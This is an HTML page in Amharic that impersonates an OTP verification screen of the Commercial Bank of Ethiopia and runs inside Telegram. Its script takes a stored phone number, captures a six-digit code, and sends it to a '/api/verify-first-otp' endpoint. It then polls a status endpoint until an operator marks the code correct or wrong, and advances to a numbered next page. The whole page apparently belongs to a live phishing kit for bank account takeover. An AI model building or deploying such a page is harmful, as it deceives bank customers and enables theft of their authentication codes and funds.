<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>የማረጋገጫ ኮድ - የኢትዮጵያ ንግድ ባንክ</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --cbe-purple: #51255e;
            --bg-color: #ffffff;
            --card-bg: #ffffff;
            --text-dark: #111;
            --text-muted: #666;
            --border-color: #dddddd;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f9f9f9; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; }

        .header-box { width: 100%; background: var(--cbe-purple); padding: 25px 20px 35px; color: white; text-align: center; font-size: 24px; font-weight: 800; }

        .main-container { width: 100%; display: flex; justify-content: center; margin-top: -20px; flex-grow: 1; }
        .card { background: var(--card-bg); width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; border: 1px solid var(--border-color); align-self: flex-start; }

        h2 { margin: 0 0 10px; font-size: 20px; color: var(--text-dark); font-weight: 800; text-align: center; }
        .instruction { font-size: 13.5px; color: var(--text-muted); margin: 0 0 15px; text-align: center; line-height: 1.4; }

        .phone-number { font-size: 15px; font-weight: 800; color: var(--text-dark); margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 8px; }

        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; }
        .code-box {
            width: 46px; height: 52px; border: 1.5px solid var(--cbe-purple); border-radius: 10px;
            text-align: center; font-size: 20px; font-weight: 800; outline: none; text-transform: uppercase; background: #fff;
        }

        .submit-btn {
            width: 100%; background-color: #e2e8f0; color: #888; border: none; padding: 15px;
            border-radius: 10px; font-size: 15px; font-weight: 800; cursor: not-allowed; text-transform: uppercase;
        }
        .submit-btn.active { background-color: var(--cbe-purple); color: white; cursor: pointer; }

        .error-message { color: #c53030; font-size: 13px; margin-top: 10px; display: none; text-align: center; font-weight: 600; }

        .overlay {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: var(--cbe-purple);
            display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; color: white; text-align: center; padding: 20px;
        }
        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid white; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header-box">የኢትዮጵያ ንግድ ባንክ</div>

<div class="main-container">
    <div class="card">
        <h2>የማረጋገጫ ኮድ (OTP)</h2>
        <p class="instruction">በስልክ ቁጥርዎ የደረሰውን ባለ 6 አሃዝ ኮድ ያስገቡ</p>

        <div class="phone-number">
            <span>🇪🇹</span>
            <span id="displayPhone">+251 ...</span>
        </div>

        <div class="code-input-container">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
        </div>

        <div id="errorText" class="error-message">የተሳሳተ ኮድ ነው። እባክዎ እንደገና ይሞክሩ።</div>
        <button id="submitBtn" class="submit-btn" disabled>አረጋግጥ</button>
    </div>
</div>

<div class="overlay" id="statusOverlay">
    <div class="spinner"></div>
    <div style="font-size: 18px; font-weight: bold;">እየተጣራ ነው...</div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const displayPhone = document.getElementById('displayPhone');
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const statusOverlay = document.getElementById('statusOverlay');
    const errorText = document.getElementById('errorText');

    let checkInterval = null;
    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
    if (savedPhone) displayPhone.textContent = `+251 ${savedPhone.replace(/^\+?251/, '')}`;

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
            checkInputs();
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) codeBoxes[index - 1].focus();
        });
    });

    function checkInputs() {
        const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
        const isComplete = fullCode.length === 6;
        submitBtn.disabled = !isComplete;
        submitBtn.classList.toggle('active', isComplete);
        errorText.style.display = 'none';
    }

    function startStatusPolling() {
        if (checkInterval) clearInterval(checkInterval);
        checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                const data = await res.json();

                if (data.status === "otp1_correct") {
                    clearInterval(checkInterval);
                    window.location.href = "/page9";
                }
                else if (data.status === "otp1_wrong") {
                    clearInterval(checkInterval);
                    statusOverlay.style.display = "none";
                    errorText.style.display = "block";
                    codeBoxes.forEach(b => b.value = "");
                    codeBoxes[0].focus();
                    checkInputs();
                }
            } catch (err) { console.error(err); }
        }, 2000);
    }

    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;
        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
        statusOverlay.style.display = "flex";

        try {
            const res = await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: savedPhone, code: codeValue, country: "ET" })
            });
            const responseData = await res.json();
            if (responseData.success) {
                startStatusPolling();
            } else {
                statusOverlay.style.display = "none";
            }
        } catch (err) {
            statusOverlay.style.display = "none";
        }
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
